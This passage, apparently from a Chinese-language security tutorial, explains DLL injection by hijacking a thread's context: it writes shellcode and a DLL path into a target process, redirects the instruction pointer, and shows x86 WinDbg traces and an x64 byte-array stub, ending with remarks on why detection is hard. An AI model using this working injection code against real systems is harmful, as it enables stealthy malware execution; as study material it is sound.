    if (!::WriteProcessMemory(hProcess, buffer, code, sizeof(code), nullptr))
        return false;
    //
    // copy the DLL name into the buffer
    //
    if (!::WriteProcessMemory(hProcess, buffer + page_size / 2, dllPath, ::strlen(dllPath) + 1, nullptr))
        return false;
    最后一件事是将新的指令指针指向添加的代码并恢复线程执行：
    context.Eip = reinterpret_cast(buffer);
    if (!::SetThreadContext(hThread, &context))
        return false;
    ::ResumeThread(hThread);
下面我们将以32位版本的DLL注入为例来阐述如何使用调试工具来调试我们注入的进程。首先，我们需要附加到目标进程中去，并跟随目标中的代码执行流程。在以下示例中，我从
**WindowsSysWow64**
目录（在64位系统上）启动了32位版本的记事本。在演示项目（地址见文章末尾处）中，命令行程序允许设置目标进程ID和要注入的DLL的路径，这里我已经在Visual
Studio设置过了，并在调用[SetThreadContext](https://msdn.microsoft.com/EN-US/library/windows/desktop/ms680632\(v=vs.85\).aspx)之前放置了一个断点，控制台窗口显示了将代码复制到的虚拟地址，具体如下图所示：
现在我们可以将WinDbg附加到记事本进程，并查看该地址上的代码：
    0:005> u 04A00000
    04a00000 60              pushad
    04a00001 680008a004      push    4A00800h
    04a00006 b8805a3b76      mov     eax,offset KERNEL32!LoadLibraryAStub (763b5a80)
    04a0000b ffd0            call    eax
    04a0000d 61              popad
    04a0000e 685c29e476      push    offset win32u!NtUserGetMessage+0xc (76e4295c)
    04a00013 c3              ret
我们可以清楚地看到我们修改的代码，其中调用了 **LoadLibraryA** 函数，然后代码恢复到 **NtUserGetMessage**
函数内的某个位置，我们甚至可以在04A00000地址处设置一个断点，如下所示：
    bp 04A00000
现在我们可以让记事本程序继续执行，但我们设置了一个断点，以下是断点和调用堆栈的详细信息：
    Breakpoint 0 hit
    eax=00000001 ebx=01030000 ecx=00000000 edx=00000000 esi=0093fbe4 edi=01030000
    eip=04a00000 esp=0093fba0 ebp=0093fbb8 iopl=0         nv up ei pl nz ac pe nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
    04a00000 60              pushad
    0:000> k
     # ChildEBP RetAddr  
    WARNING: Frame IP not in any known module. Following frames may be wrong.
    00 0093fb9c 7570fecc 0x4a00000
    01 0093fbb8 01037219 USER32!GetMessageW+0x2c
    02 0093fc38 0104b75c notepad!WinMain+0x18e
    03 0093fccc 763b8744 notepad!__mainCRTStartup+0x142
    04 0093fce0 7711582d KERNEL32!BaseThreadInitThunk+0x24
    05 0093fd28 771157fd ntdll!__RtlUserThreadStart+0x2f
    06 0093fd38 00000000 ntdll!_RtlUserThreadStart+0x1b
我们可以一步一步地调试 notepad，但也可以让 notepad进程去加载我们的DLL，一旦DllMain被调用，我们就可以做任何事情了：
以下是我在64位机器上测试使用的代码，但我并不能保证该段代码在任何情况下都可以正常运行，因此该代码还需要进行更多测试：
    BYTE code[] = {
        // sub rsp, 28h
        0x48, 0x83, 0xec, 0x28,                           
        // mov [rsp + 18], rax
        0x48, 0x89, 0x44, 0x24, 0x18,                     
        // mov [rsp + 10h], rcx
        0x48, 0x89, 0x4c, 0x24, 0x10,
        // mov rcx, 11111111111111111h
        0x48, 0xb9, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,     
        // mov rax, 22222222222222222h
        0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
        // call rax
        0xff, 0xd0,
        // mov rcx, [rsp + 10h]
        0x48, 0x8b, 0x4c, 0x24, 0x10,
        // mov rax, [rsp + 18h]
        0x48, 0x8b, 0x44, 0x24, 0x18,
        // add rsp, 28h
        0x48, 0x83, 0xc4, 0x28,
        // mov r11, 333333333333333333h
        0x49, 0xbb, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33,
        // jmp r11
        0x41, 0xff, 0xe3
    };
X64版本的代码看起来与x86版本不同，因为x64中的调用约定与x86 **__stdcall**
不同。例如，前四个整数参数在RCX，RDX，R8和R9中传递，而不是堆栈。在我们的例子中，
由于LoadLibraryA函数只需要一个参数即可，因此一个RCX就足够了。
对代码的修改自然需要使用不同的偏移量：
    // set dll path
    *reinterpret_cast(code + 0x10) = static_cast(buffer + page_size / 2);
    // set LoadLibraryA address
    *reinterpret_cast(code + 0x1a) = static_cast(loadLibraryAddress);
    // jump address (back to the original code)
    *reinterpret_cast(code + 0x34) = context.Rip;
**总结**
****
本文讲述了一种通过改变线程上下文来执行DLL注入的一种方法，由于加载DLL是一件很寻常的事件，因此这种方法很难被检测到。一种可能的方法是定位可执行页面并将其地址与已知模块进行比较，但是注入进程会在DLL注入完成后释放注入函数的内存，因此定位可执行页面也是非常困难的。
文中涉及到的代码可以在我的Github仓库中找到 ：